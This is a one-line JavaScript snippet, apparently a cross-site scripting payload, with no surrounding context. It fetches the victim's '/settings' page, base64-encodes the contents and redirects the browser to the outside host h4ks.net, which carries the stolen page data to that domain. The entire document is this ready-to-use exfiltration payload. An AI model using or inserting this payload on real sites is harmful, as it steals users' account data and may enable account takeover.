fetch('/settings').then(r=>r.text()).then(body=>{location='//h4ks.net/go/?'+btoa(body);})
